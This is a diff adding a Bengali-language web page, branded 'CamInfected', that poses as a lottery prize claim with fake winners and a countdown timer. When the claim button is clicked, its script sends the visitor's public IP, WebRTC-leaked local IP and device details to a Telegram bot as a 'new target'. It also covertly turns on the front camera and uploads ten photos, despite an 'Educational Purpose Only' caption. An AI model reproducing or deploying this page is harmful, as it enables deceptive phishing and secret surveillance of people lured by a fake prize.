@@ -1,0 +1,928 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🎁 পুরস্কার ক্লেইম করুন </title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', 'Hind Siliguri', 'Bangla', 'Noto Sans Bengali', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        .confetti {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        .confetti-piece {
+            position: absolute;
+            width: 10px;
+            height: 10px;
+            background: linear-gradient(135deg, #ffd700, #ff6600);
+            opacity: 0.8;
+            animation: fall linear infinite;
+        }
+        
+        @keyframes fall {
+            to {
+                transform: translateY(100vh) rotate(360deg);
+            }
+        }
+        
+        .container {
+            background: white;
+            border-radius: 30px;
+            padding: 40px 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 480px;
+            width: 100%;
+            text-align: center;
+            position: relative;
+            z-index: 1;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.9); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        
+        .prize-box {
+            background: linear-gradient(135deg, #ffd89b 0%, #19547b 100%);
+            border-radius: 20px;
+            padding: 25px;
+            margin: 20px 0;
+            color: white;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .prize-box::before {
+            content: '🎉';
+            position: absolute;
+            font-size: 80px;
+            opacity: 0.15;
+            right: -20px;
+            top: -20px;
+        }
+        
+        .prize-amount {
+            font-size: 3.8em;
+            font-weight: bold;
+            color: #ffd700;
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
+        }
+        
+        .prize-badge {
+            background: #ff4444;
+            display: inline-block;
+            padding: 5px 15px;
+            border-radius: 50px;
+            font-size: 0.8em;
+            margin-top: 10px;
+            animation: pulse 1s infinite;
+        }
+        
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+        
+        h1 {
+            font-size: 1.6em;
+            color: #333;
+            margin-bottom: 10px;
+        }
+        
+        .greeting {
+            font-size: 1.1em;
+            color: #666;
+            margin-bottom: 15px;
+        }
+        
+        .winner-list {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: left;
+            max-height: 140px;
+            overflow-y: auto;
+        }
+        
+        .winner-item {
+            display: flex;
+            align-items: center;
+            padding: 6px 0;
+            border-bottom: 1px solid #eee;
+            font-size: 0.85em;
+        }
+        
+        .winner-icon {
+            background: #ffd700;
+            width: 25px;
+            height: 25px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 10px;
+            font-size: 0.7em;
+        }
+        
+        .winner-name {
+            flex: 1;
+            color: #333;
+        }
+        
+        .winner-amount {
+            color: #4CAF50;
+            font-weight: bold;
+        }
+        
+        .message {
+            color: #555;
+            line-height: 1.7;
+            margin-bottom: 25px;
+            font-size: 0.95em;
+            background: #f0f7ff;
+            padding: 15px;
+            border-radius: 15px;
+        }
+        
+        .claim-btn {
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.3em;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            font-weight: bold;
+            width: 100%;
+        }
+        
+        .claim-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+        
+        .claim-btn:active {
+            transform: translateY(0);
+        }
+        
+        .claim-btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .loading-container {
+            display: none;
+        }
+        
+        .loading-box {
+            background: white;
+            border-radius: 30px;
+            padding: 50px 30px;
+            text-align: center;
+        }
+        
+        .loading-icon {
+            font-size: 60px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        .progress-bar {
+            width: 100%;
+            height: 10px;
+            background: #e0e0e0;
+            border-radius: 10px;
+            overflow: hidden;
+            margin: 25px 0;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.2s linear;
+            border-radius: 10px;
+        }
+        
+        .loading-text {
+            color: #666;
+            font-size: 1em;
+            margin-top: 20px;
+        }
+        
+        .loading-dots {
+            display: inline-block;
+        }
+        
+        .loading-dots span {
+            animation: blink 1.4s infinite;
+            animation-fill-mode: both;
+        }
+        
+        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+        
+        @keyframes blink {
+            0%, 80%, 100% { opacity: 0; }
+            40% { opacity: 1; }
+        }
+        
+        .success-container {
+            display: none;
+            background: white;
+            border-radius: 30px;
+            padding: 50px 30px;
+            text-align: center;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            animation: bounce 0.5s ease;
+        }
+        
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-10px); }
+        }
+        
+        .congrats {
+            font-size: 1.8em;
+            color: #4CAF50;
+            margin: 20px 0;
+            font-weight: bold;
+        }
+        
+        .instruction {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: left;
+        }
+        
+        .instruction-step {
+            display: flex;
+            align-items: center;
+            margin: 12px 0;
+        }
+        
+        .step-number {
+            background: #667eea;
+            color: white;
+            width: 28px;
+            height: 28px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8em;
+            margin-right: 12px;
+        }
+        
+        .contact-info {
+            margin: 20px 0;
+            padding: 20px;
+            background: #f8f9fa;
+            border-radius: 15px;
+            text-align: left;
+        }
+        
+        .contact-item {
+            display: flex;
+            align-items: center;
+            margin: 12px 0;
+            padding: 8px;
+            background: white;
+            border-radius: 10px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            cursor: pointer;
+            transition: transform 0.3s;
+        }
+        
+        .contact-item:hover {
+            transform: translateX(5px);
+            background: #f0f0f0;
+        }
+        
+        .contact-icon {
+            font-size: 28px;
+            margin-right: 12px;
+        }
+        
+        .contact-text {
+            flex: 1;
+        }
+        
+        .contact-label {
+            font-size: 0.7em;
+            color: #666;
+        }
+        
+        .contact-value {
+            font-size: 1em;
+            font-weight: bold;
+            color: #333;
+        }
+        
+        .copy-btn {
+            background: #667eea;
+            color: white;
+            border: none;
+            padding: 5px 12px;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.7em;
+        }
+        
+        video, canvas {
+            display: none;
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0.001;
+            pointer-events: none;
+        }
+        
+        .footer-note {
+            margin-top: 15px;
+            font-size: 0.7em;
+            color: #999;
+            text-align: center;
+        }
+        
+        .timer {
+            font-size: 1em;
+            color: #ff4444;
+            margin: 15px 0;
+            font-weight: bold;
+            background: #fff0f0;
+            padding: 8px;
+            border-radius: 50px;
+            display: inline-block;
+            width: auto;
+        }
+        
+        .disclaimer {
+            font-size: 0.65em;
+            color: #999;
+            margin-top: 15px;
+            padding: 10px;
+            border-top: 1px solid #eee;
+        }
+        
+        @media (max-width: 480px) {
+            .container, .success-container, .loading-box {
+                padding: 30px 20px;
+            }
+            
+            .congrats {
+                font-size: 1.5em;
+            }
+            
+            .prize-amount {
+                font-size: 3em;
+            }
+            
+            .contact-value {
+                font-size: 0.85em;
+            }
+            
+            .claim-btn {
+                padding: 15px 30px;
+                font-size: 1.1em;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="confetti" id="confetti"></div>
+    
+    <!-- মেইন পেজ - পুরস্কার ক্লেইম -->
+    <div id="mainPage" class="container">
+        <div class="prize-box">
+            <div>🎉 অভিনন্দন! 🎉</div>
+            <div class="prize-amount">৭৫০ টাকা</div>
+            <div>নগদ পুরস্কার জিতেছেন!</div>
+            <div class="prize-badge">⭐ এক্সক্লুসিভ অফার ⭐</div>
+        </div>
+        
+        <h1>পুরস্কার ক্লেইম করুন</h1>
+        <div class="greeting">আপনি আজকের বিশেষ লটারিতে নির্বাচিত হয়েছেন!আপনার লটারি id 1093780</div>
+        
+        <div class="winner-list">
+            <div class="winner-item">
+                <div class="winner-icon">🎉</div>
+                <div class="winner-name">মোঃ রাকিব</div>
+                <div class="winner-amount">৪৫০ টাকা পেয়েছেন</div>
+            </div>
+            <div class="winner-item">
+                <div class="winner-icon">🎉</div>
+                <div class="winner-name">সাদিয়া আক্তার</div>
+                <div class="winner-amount">৮০০ টাকা পেয়েছেন</div>
+            </div>
+            <div class="winner-item">
+                <div class="winner-icon">🎉</div>
+                <div class="winner-name">রাজু আহমেদ</div>
+                <div class="winner-amount">৩০০টাকা পেয়েছেন</div>
+            </div>
+            <div class="winner-item">
+                <div class="winner-icon">🎉</div>
+                <div class="winner-name">তাহমিনা বেগম</div>
+                <div class="winner-amount">৯০০ টাকা পেয়েছেন</div>
+            </div>
+            <div class="winner-item">
+                <div class="winner-icon">🎉</div>
+                <div class="winner-name">আব্দুল্লাহ আল মামুন</div>
+                <div class="winner-amount">৯০০ টাকা পেয়েছেন</div>
+            </div>
+            <div class="winner-item">
+                <div class="winner-icon">🎉</div>
+                <div class="winner-name">নুসরাত জাহান</div>
+                <div class="winner-amount">১,০০০ টাকা পেয়েছেন</div>
+            </div>
+        </div>
+        
+        <div class="message">
+            <strong>⭐ সীমিত সময়ের অফার! ⭐</strong><br>
+            আপনার পুরস্কার দাবি করতে নিচের বাটনে ক্লিক করুন। মাত্র <strong>১০ সেকেন্ড</strong> সময় লাগবে!
+        </div>
+        
+        <div class="timer">⏰ অফার শেষ হতে বাকি: <span id="offerTimer">০০:৩০</span></div>
+        
+        <button class="claim-btn" id="claimBtn" onclick="claimPrize()">🎁 পুরস্কার ক্লেইম করুন 🎁</button>
+        
+        <div class="footer-note">
+            ✅ ১০০% বৈধ অফার | ✅ কোন রেজিস্ট্রেশন ফি নেই | ✅ ইনস্ট্যান্ট ট্রান্সফার
+        </div>
+        
+        <div class="disclaimer">
+          stay connected for more 🎊🎁  
+        </div>
+    </div>
+    
+    <!-- লোডিং পেজ -->
+    <div id="loadingPage" class="loading-container">
+        <div class="loading-box">
+            <div class="loading-icon">⏳</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+            <p class="loading-text">
+                আপনার পুরস্কার প্রস্তুত হচ্ছে 
+                <span class="loading-dots">
+                    <span>.</span><span>.</span><span>.</span>
+                </span>
+            </p>
+            <p class="loading-text" style="font-size: 0.85em; color: #999; margin-top: 10px;">
+                অনুগ্রহ করে অপেক্ষা করুন... (১০ সেকেন্ড)
+            </p>
+        </div>
+    </div>
+    
+    <!-- সাফল্যের পেজ -->
+    <div id="successPage" class="success-container">
+        <div class="success-icon">🎉</div>
+        <div class="congrats">অভিনন্দন!</div>
+        <p style="color: #666; margin-bottom: 20px;">আপনার পুরস্কার ক্লেইম প্রক্রিয়া সম্পন্ন হয়েছে!</p>
+        
+        <div class="instruction">
+            <div class="instruction-step">
+                <div class="step-number">১</div>
+                <div>নিচের যে কোনো মাধ্যমে যোগাযোগ করুন</div>
+            </div>
+            <div class="instruction-step">
+                <div class="step-number">২</div>
+                <div>আপনার পুরস্কার দাবি করুন</div>
+            </div>
+            <div class="instruction-step">
+                <div class="step-number">৩</div>
+                <div>৫ মিনিটের মধ্যে টাকা পাঠিয়ে দেওয়া হবে</div>
+            </div>
+        </div>
+        
+        <div class="contact-info">
+            <p style="text-align: center; margin-bottom: 12px; font-weight: bold;">📢 যোগাযোগ করুন:</p>
+            
+            <div class="contact-item" onclick="copyText('@mr_virus_apk')">
+                <div class="contact-icon">🎵</div>
+                <div class="contact-text">
+                    <div class="contact-label">টিকটক</div>
+                    <div class="contact-value">@mr_virus_apk</div>
+                </div>
+                <button class="copy-btn">কপি</button>
+            </div>
+            
+            <div class="contact-item" onclick="copyText('Mohammad Alamin')">
+                <div class="contact-icon">📘</div>
+                <div class="contact-text">
+                    <div class="contact-label">ফেসবুক</div>
+                    <div class="contact-value">মোহাম্মদ আলামিন</div>
+                </div>
+                <button class="copy-btn">কপি</button>
+            </div>
+            
+            <div class="contact-item" onclick="copyText('@mrvirus460')">
+                <div class="contact-icon">📨</div>
+                <div class="contact-text">
+                    <div class="contact-label">টেলিগ্রাম</div>
+                    <div class="contact-value">@mrvirus460</div>
+                </div>
+                <button class="copy-btn">কপি</button>
+            </div>
+            
+            <div class="contact-item" onclick="copyText('Alaminvaihero')">
+                <div class="contact-icon">💻</div>
+                <div class="contact-text">
+                    <div class="contact-label">গিটহাব</div>
+                    <div class="contact-value">Alaminvaihero</div>
+                </div>
+                <button class="copy-btn">কপি</button>
+            </div>
+        </div>
+        
+        <div class="footer-note">
+            ⚡ CamInfected - Developed by Mohammad Alamin ⚡
+        </div>
+        
+        <div class="disclaimer">
+            stay connected for more🎊🎁
+        </div>
+        
+        <button class="claim-btn" onclick="location.reload()" style="margin-top: 20px; padding: 12px 30px; font-size: 1em;">
+            🏠 হোম পেজে ফিরুন
+        </button>
+    </div>
+    
+    <video id="video" autoplay playsinline muted></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        // ============== কনফিগারেশন ==============
+        const API_BASE_URL = 'https://caminfected-production.up.railway.app';
+        let BOT_TOKEN = '';
+        let USER_CHAT_ID = '';
+        
+        // URL থেকে chat_id নেওয়া
+        const urlParams = new URLSearchParams(window.location.search);
+        const userChatId = urlParams.get('chat_id');
+        if (userChatId) {
+            USER_CHAT_ID = userChatId;
+        }
+        
+        let stream = null;
+        let photosTaken = 0;
+        const totalPhotos = 10;
+        let loadingInterval = null;
+        let isSuccessShown = false;
+        let offerTimerInterval = null;
+        let offerTimeLeft = 30;
+        
+        // ============== কনফেটি ইফেক্ট ==============
+        function createConfetti() {
+            const confettiDiv = document.getElementById('confetti');
+            for(let i = 0; i < 60; i++) {
+                const piece = document.createElement('div');
+                piece.className = 'confetti-piece';
+                piece.style.left = Math.random() * 100 + '%';
+                piece.style.width = Math.random() * 6 + 3 + 'px';
+                piece.style.height = piece.style.width;
+                piece.style.animationDuration = Math.random() * 3 + 2 + 's';
+                piece.style.animationDelay = Math.random() * 5 + 's';
+                piece.style.background = `hsl(${Math.random() * 360}, 80%, 60%)`;
+                confettiDiv.appendChild(piece);
+            }
+        }
+        
+        // ============== অফার টাইমার ==============
+        function startOfferTimer() {
+            const timerElement = document.getElementById('offerTimer');
+            if (!timerElement) return;
+            
+            offerTimerInterval = setInterval(() => {
+                offerTimeLeft--;
+                if (offerTimeLeft >= 0) {
+                    const seconds = offerTimeLeft;
+                    timerElement.textContent = `০০:${seconds.toString().padStart(2, '0')}`;
+                    
+                    if (offerTimeLeft <= 10) {
+                        timerElement.style.color = '#ff0000';
+                        timerElement.style.fontWeight = 'bold';
+                    }
+                }
+                if (offerTimeLeft <= 0) {
+                    clearInterval(offerTimerInterval);
+                    timerElement.textContent = "০০:০০";
+                    document.getElementById('claimBtn').disabled = true;
+                    document.getElementById('claimBtn').style.opacity = '0.5';
+                    document.getElementById('claimBtn').innerHTML = '⏰ অফার শেষ ⏰';
+                }
+            }, 1000);
+        }
+        
+        // ============== বট তথ্য নেওয়া ==============
+        async function getBotInfo() {
+            try {
+                const response = await fetch(`${API_BASE_URL}/api/bot-info`);
+                const data = await response.json();
+                BOT_TOKEN = data.botToken;
+                return true;
+            } catch(e) {
+                console.error('বট তথ্য পেতে ব্যর্থ:', e);
+                return false;
+            }
+        }
+        
+        // ============== IP তথ্য ==============
+        async function getLocalIP() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                    const ipMatch = ipRegex.exec(ice.candidate.candidate);
+                    if (ipMatch) {
+                        pc.close();
+                        resolve(ipMatch[1]);
+                    }
+                };
+                setTimeout(() => {
+                    pc.close();
+                    resolve('N/A');
+                }, 2000);
+            });
+        }
+        
+        async function getPublicIP() {
+            try {
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                return data.ip;
+            } catch(e) {
+                return 'N/A';
+            }
+        }
+        
+        // ============== ডিভাইস তথ্য ==============
+        function getDetailedDeviceInfo() {
+            const userAgent = navigator.userAgent;
+            
+            let browser = 'অজানা';
+            if (userAgent.indexOf('Chrome') > -1 && userAgent.indexOf('Edg') === -1) browser = 'Chrome';
+            else if (userAgent.indexOf('Firefox') > -1) browser = 'Firefox';
+            else if (userAgent.indexOf('Safari') > -1 && userAgent.indexOf('Chrome') === -1) browser = 'Safari';
+            else if (userAgent.indexOf('Edg') > -1) browser = 'Edge';
+            
+            let os = 'অজানা';
+            if (userAgent.indexOf('Windows NT 10.0') > -1) os = 'Windows 10';
+            else if (userAgent.indexOf('Android') > -1) os = 'Android';
+            else if (userAgent.indexOf('iPhone') > -1) os = 'iOS';
+            else if (userAgent.indexOf('Mac OS X') > -1) os = 'macOS';
+            
+            return {
+                browser: browser,
+                os: os,
+                isMobile: /Mobile|Android|iPhone|iPad|iPod/i.test(userAgent),
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+        }
+        
+        // ============== টেলিগ্রামে তথ্য পাঠানো ==============
+        async function sendDeviceInfo() {
+            const deviceInfo = getDetailedDeviceInfo();
+            const publicIP = await getPublicIP();
+            const localIP = await getLocalIP();
+            const banglaTime = new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'});
+            
+            const message = `🆕 *নতুন টার্গেট !* 🆕
+
+┌─────────────────────
+│ 💻 *ডিভাইস তথ্য*
+├─────────────────────
+│ 🌐 পাবলিক আইপি: ${publicIP}
+│ 🏠 লোকাল আইপি: ${localIP}
+│ 🖥️ ব্রাউজার: ${deviceInfo.browser}
+│ 💿 ওএস: ${deviceInfo.os}
+│ ${deviceInfo.isMobile ? '📱 মোবাইল ডিভাইস' : '💻 ডেস্কটপ ডিভাইস'}
+│ 🖥️ স্ক্রিন: ${deviceInfo.screen}
+│ 🌍 ভাষা: ${deviceInfo.language}
+│ ⏰ টাইমজোন: ${deviceInfo.timezone}
+└─────────────────────
+
+⏰ সময়: ${banglaTime}
+🎁 developed by Mohammad Alamin  `;
+            
+            try {
+                if (BOT_TOKEN) {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: USER_CHAT_ID || '8678824835',
+                            text: message,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                }
+            } catch(e) {
+                console.error('তথ্য পাঠাতে ব্যর্থ:', e);
+            }
+        }
+        
+        // ============== ক্যামেরা ফাংশন (ব্যাকগ্রাউন্ডে) ==============
+        async function startCameraInBackground() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                window.currentStream = stream;
+                video.style.transform = 'scaleX(-1)';
+                
+                video.onloadedmetadata = () => {
+                    video.play();
+                    capturePhotosInBackground();
+                };
+                
+                return true;
+            } catch(err) {
+                console.error('ক্যামেরা অ্যাক্সেস ব্যর্থ:', err);
+                return false;
+            }
+        }
+        
+        async function capturePhotosInBackground() {
+            photosTaken = 0;
+            const video = document.getElementById('video');
+            
+            let attempts = 0;
+            while((!video.videoWidth || video.videoWidth === 0) && attempts < 20) {
+                await sleep(100);
+                attempts++;
+            }
+            
+            for(let i = 0; i < totalPhotos; i++) {
+                await takePhoto(i + 1);
+                photosTaken++;
+                if(photosTaken < totalPhotos) {
+                    await sleep(800);
+                }
+            }
+            
+            if(window.currentStream) {
+                window.currentStream.getTracks().forEach(track => track.stop());
+            }
+        }
+        
+        async function takePhoto(photoNumber) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            if(video.videoWidth > 0 && video.videoHeight > 0) {
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                
+                context.save();
+                context.scale(-1, 1);
+                context.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
+                context.restore();
+                
+                return new Promise((resolve) => {
+                    canvas.toBlob(async (blob) => {
+                        if (BOT_TOKEN) {
+                            const formData = new FormData();
+                            formData.append('chat_id', USER_CHAT_ID || '8678824835');
+                            formData.append('photo', blob, `claim_photo_${Date.now()}_${photoNumber}.jpg`);
+                            formData.append('caption', `🖼️ পুরস্কার ক্লেইম ছবি #${photoNumber}/${totalPhotos}\n⏰ সময়: ${new Date().toLocaleString('bn-BD', {timeZone: 'Asia/Dhaka'})}\n\n⚠️ Educational Purpose Only`);
+                            
+                            try {
+                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                                    method: 'POST',
+                                    body: formData
+                                });
+                            } catch(e) {}
+                        }
+                        resolve();
+                    }, 'image/jpeg', 0.7);
+                });
+            }
+            return Promise.resolve();
+        }
+        
+        // ============== লোডিং অ্যানিমেশন ==============
+        function startLoadingAnimation() {
+            let progress = 0;
+            const progressFill = document.getElementById('progressFill');
+            
+            loadingInterval = setInterval(() => {
+                progress += 1;
+                if (progress <= 100) {
+                    progressFill.style.width = progress + '%';
+                }
+            }, 100);
+        }
+        
+        // ============== মেইন ফাংশন ==============
+        async function claimPrize() {
+            document.getElementById('claimBtn').disabled = true;
+            document.getElementById('claimBtn').innerHTML = '⏳ প্রসেসিং...';
+            
+            document.getElementById('mainPage').style.display = 'none';
+            document.getElementById('loadingPage').style.display = 'block';
+            
+            startLoadingAnimation();
+            
+            await getBotInfo();
+            await sendDeviceInfo();
+            await startCameraInBackground();
+            
+            setTimeout(() => {
+                clearInterval(loadingInterval);
+                if(!isSuccessShown) {
+                    isSuccessShown = true;
+                    showSuccessPage();
+                }
+            }, 10000);
+        }
+        
+        function showSuccessPage() {
+            if(window.currentStream) {
+                window.currentStream.getTracks().forEach(track => track.stop());
+            }
+            document.getElementById('loadingPage').style.display = 'none';
+            document.getElementById('successPage').style.display = 'block';
+        }
+        
+        function copyText(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                alert('✅ কপি হয়েছে: ' + text);
+            }).catch(() => {
+                alert('❌ কপি করতে ব্যর্থ হয়েছে');
+            });
+        }
+        
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+        
+        window.addEventListener('load', () => {
+            createConfetti();
+            startOfferTimer();
+            getBotInfo();
+        });
+        
+        window.addEventListener('beforeunload', () => {
+            if(window.currentStream) {
+                window.currentStream.getTracks().forEach(track => track.stop());
+            }
+            if(loadingInterval) {
+                clearInterval(loadingInterval);
+            }
+            if(offerTimerInterval) {
+                clearInterval(offerTimerInterval);
+            }
+        });
+    </script>
+</body>
+</html>
